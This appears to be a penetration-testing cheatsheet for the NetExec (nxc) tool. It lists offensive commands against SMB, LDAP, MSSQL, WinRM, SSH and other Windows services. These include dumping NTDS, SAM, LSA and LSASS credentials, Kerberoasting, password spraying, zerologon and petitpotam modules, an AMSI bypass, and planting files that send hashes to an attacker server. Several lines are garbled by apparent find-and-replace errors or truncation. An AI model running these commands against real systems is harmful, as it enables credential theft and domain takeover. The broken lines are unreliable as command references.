# nxc Cheatsheet
nxc $ip -u $user -p $pass --sessions
nxc $ip -u $user -p $pass -x whoami
nxc ftp $ip -u $pass -p $pass --ls
nxc ftp $ip -u $user -p $pass --ls
nxc ftp $ip -u $user -p $pass --ls folder_name
nxc ftp $ip -u $user -p $pass --ls folder_name --get file_name
nxc ftp $ip -u $user -p $pass --no-bruteforce
nxc ldap $dc $user -p $pass -k --get-sid
nxc ldap $dc -k --kdcHost $dc -M daclread -o TARGET=$ip ACTION=backup
nxc ldap $dc -k --kdcHost $dc -M daclread -o TARGET=$ip ACTION=read
nxc ldap $dc -k --kdcHost $dc -M daclread -o TARGET=$ip ACTION=read ACE_TYPE=denied
nxc ldap $dc -k --kdcHost $dc -M daclread -o TARGET=$ip ACTION=read PRINCIPAL=BlWasp
nxc ldap $dc -k --kdcHost $dc -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync
nxc ldap $dc -u $user -p $pass -M laps -o computer=$ip
nxc ldap $dom -u $user -p $pass --gmsa-decrypt-lsa gmsa_account
nxc ldap $dom -u $user -p $pass -M get-desc-users
nxc ldap $ip -u $user -H $hash
nxc ldap $ip -u $user -p $pass
nxc ldap $ip -u $user -p $pass --$user-count
nxc ldap $ip -u $user -p $pass --active-users
nxc ldap $ip -u $user -p $pass --asreproast asrep.txt
nxc ldap $ip -u $user -p $pass --asreproast $user.asreproast.txt --kdcHost $dom
nxc ldap $ip -u $user -p $pass --bloodhound --collection All
nxc ldap $ip -u $user -p $pass --bloodhound -ns $ip --collection All
nxc ldap $ip -u $user -p $pass --dc-ip $ip
nxc ldap $ip -u $user -p $pass --gmsa
nxc ldap $ip -u $user -p $pass --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
nxc ldap $ip -u $user -p $pass --gmsa-convert-id id
nxc ldap $ip -u $user -p $pass --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724...'
nxc ldap $ip -u $user -p $pass --kerberoasting kerb.txt
nxc ldap $ip -u $user -p $pass --kerberoasting output.txt
nxc ldap $ip -u $user -p $pass --trusted-for-delegation
nxc ldap $ip -u $user -p $pass --trusted-for-delegation  --pass-not-required --user-count --users --groups
nxc ldap $ip -u $user -p $pass --users
nxc ldap $ip -u $user -p $pass -M adcs
nxc ldap $ip -u $user -p $pass -M enum_trusts
nxc ldap $ip -u $user -p $pass -M get-network
nxc ldap $ip -u $user -p $pass -M get-network -o ALL=true
nxc ldap $ip -u $user -p $pass -M get-network -o ONLY_HOSTS=true
nxc ldap $ip -u $user -p $pass -M ldap-checker
nxc ldap $ip -u $user -p $pass -M maq
nxc ldap $ip -u $user -p $pass -k
nxc ldap $ip -u $user -p $pass -query "(sAMAccountName=$user)" ""
nxc ldap $ip -u $user -p $pass -query "(sAMAccountName=$user)" "sAMAccountName objectClass pwdLastSet"
nxc mssql $ip -u $user -p $pass
nxc mssql $ip -u $user -p $pass --get-file C
nxc mssql $ip -u $user -p $pass --get-file output_file $ip_file
nxc mssql $ip -u $user -p $pass --local-auth
nxc mssql $ip -u $user -p $pass --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql $ip -u $user -p $pass --no-bruteforce
nxc mssql $ip -u $user -p $pass --port $port
nxc mssql $ip -u $user -p $pass --put-file  --put-file /tmp/users C
nxc mssql $ip -u $user -p $pass -d $dom
nxc mssql $ip -u $user -p $pass -x command_to_execute
nxc mssql $ip -u $user -p $pass -M mssql_priv
nxc mssql $ip -u sa -p $pass --local-auth -x whoami
nxc rdp $ip -u $user -p $pass
nxc rdp $ip -u $user -p $pass --no-bruteforce
nxc smb $dc --use-kcache
nxc smb $ip --gen-relay-list relay.txt
nxc smb $ip --gen-relay-list relay_list.txt
nxc smb $ip -u "${dc}01\$" -H $hash --delegate $user --self
nxc smb $ip -u $user  -p $pass  -M spider_plus
nxc smb $ip -u $user  -p $pass  -M spider_plus -o DOWNLOAD_FLAG=True
nxc smb $ip -u $user -H $hash
nxc smb $ip -u $user -H $hash --local-auth
nxc smb $ip -u $user -p $pass
nxc smb $ip -u $user -p $pass --continue-on-success
nxc smb $ip -u $user -p $pass --delegate $user
nxc smb $ip -u $user -p $pass --disks
nxc smb $ip -u $user -p $pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
nxc smb $ip -u $user -p $pass --groups
nxc smb $ip -u $user -p $pass --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
nxc smb $ip -u $user -p $pass --interfaces
nxc smb $ip -u $user -p $pass --laps
nxc smb $ip -u $user -p $pass --laps --dpapi
nxc smb $ip -u $user -p $pass --local-auth
nxc smb $ip -u $user -p $pass --local-auth --lsa
nxc smb $ip -u $user -p $pass --local-group
nxc smb $ip -u $user -p $pass --local-groups
nxc smb $ip -u $user -p $pass --loggedon-users
nxc smb $ip -u $user -p $pass --lsa
nxc smb $ip -u $user -p $pass --ntds
nxc smb $ip -u $user -p $pass --ntds #Via RPC
nxc smb $ip -u $user -p $pass --ntds --users
nxc smb $ip -u $user -p $pass --ntds --users --enabled
nxc smb $ip -u $user -p $pass --ntds vss
nxc smb $ip -u $user -p $pass --ntds vss #Via VSS
nxc smb $ip -u $user -p $pass --pass-pol
nxc smb $ip -u $user -p $pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
nxc smb $ip -u $user -p $pass --rid-brute
nxc smb $ip -u $user -p $pass --sam
nxc smb $ip -u $user -p $pass --sccm
nxc smb $ip -u $user -p $pass --sccm disk
nxc smb $ip -u $user -p $pass --sccm wmi
nxc smb $ip -u $user -p $pass --sessions
nxc smb $ip -u $user -p $pass --shares
nxc smb $ip -u $user -p $pass --shares --filter-shares READ WRITE
nxc smb $ip -u $user -p $pass --users
nxc smb $ip -u $user -p $pass -M enum_av
nxc smb $ip -u $user -p $pass -M gpp_$pass
nxc smb $ip -u $user -p $pass -M lsassy
nxc smb $ip -u $user -p $pass -M mimikatz
nxc smb $ip -u $user -p $pass -M mimikatz -o COMMAND='"lsadump
nxc smb $ip -u $user -p $pass -M mremoteng
nxc smb $ip -u $user -p $pass -M msol
nxc smb $ip -u $user -p $pass -M nanodump
nxc smb $ip -u $user -p $pass -M nopac
nxc smb $ip -u $user -p $pass -M ntdsutil
nxc smb $ip -u $user -p $pass -M petitpotam
nxc smb $ip -u $user -p $pass -M procdump
nxc smb $ip -u $user -p $pass -M rdcman
nxc smb $ip -u $user -p $pass -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
nxc smb $ip -u $user -p $pass -M scuffy -o SERVER=$myip -o NAME=$file
nxc smb $ip -u $user -p $pass -M security-questions
nxc smb $ip -u $user -p $pass -M slinky -o SERVER=$myip -o NAME=$file
nxc smb $ip -u $user -p $pass -M spider_plus
nxc smb $ip -u $user -p $pass -M spider_plus -o READ_ONLY=False
nxc smb $ip -u $user -p $pass -M spider_plus -o READ_ONLY=false
nxc smb $ip -u $user -p $pass -M teams_localdb
nxc smb $ip -u $user -p $pass -M veeam
nxc smb $ip -u $user -p $pass -M vnc
nxc smb $ip -u $user -p $pass -M winscp
nxc smb $ip -u $user -p $pass -M wireless
nxc smb $ip -u $user -p $pass -M zerologon
nxc smb $ip -u $user -p $pass -X '$PSVersionTable'
nxc smb $ip -u $user -p $pass -X '$PSVersionTable'  --amsi-bypass /path/payload
nxc smb $ip -u $user -p $pass -dpapi
nxc smb $ip -u $user -p $pass -dpapi cookies
nxc smb $ip -u $user -p $pass -dpapi nosystem
nxc smb $ip -u $user -p $pass -k
nxc smb $ip -u $user -p $pass -k --get-file $ip_file output_file --share sharename
nxc smb $ip -u $user -p $pass -local-auth --dpapi nosystem
nxc smb $ip -u $user -p $pass -x whoami
nxc smb $ip -u $user -p $pass.txt
nxc smb $ip -u $user -p $pass.txt --no-bruteforce --continue-on-success
nxc smb $ip -u $user -p user.txt --no-bruteforce --continue-on-success
nxc smb $ip -u $user2 -H $hash --delegate $user --self
nxc smb $ip -u 'a' -p $pass --shares
nxc smb $ip -u 'guest' -p $pass
nxc smb -M lsassy --options
nxc smb ip -u $user -p $pass -M ntdsutil
nxc smb ip -u $user -p $pass -M slinky
nxc smb ip -u $user -p $pass -M webdav
nxc ssh $ip -u $user -p $pass
nxc ssh $ip -u $user -p $pass --continue-on-success
nxc ssh $ip -u $user -p $pass --no-bruteforce
nxc ssh $ip -u $user -p $pass -x whoami
nxc winrm $ip -u $user $pass -X whoami
nxc winrm $ip -u $user -p $pass
nxc winrm $ip -u $user -p $pass $dom
nxc winrm $ip -u $user -p $pass --no-bruteforce
nxc wmi $ip -u $user -p $pass
nxc wmi $ip -u $user -p $pass --no-bruteforce
nxc wmi $ip -u $user -p $pass -d $dom
nxc wmi $ip -u $user -p $user --local-auth
sudo nxc smb $dc --use-kcache -x whoami
sudo nxc smb $dc -k -u $user -p $pass
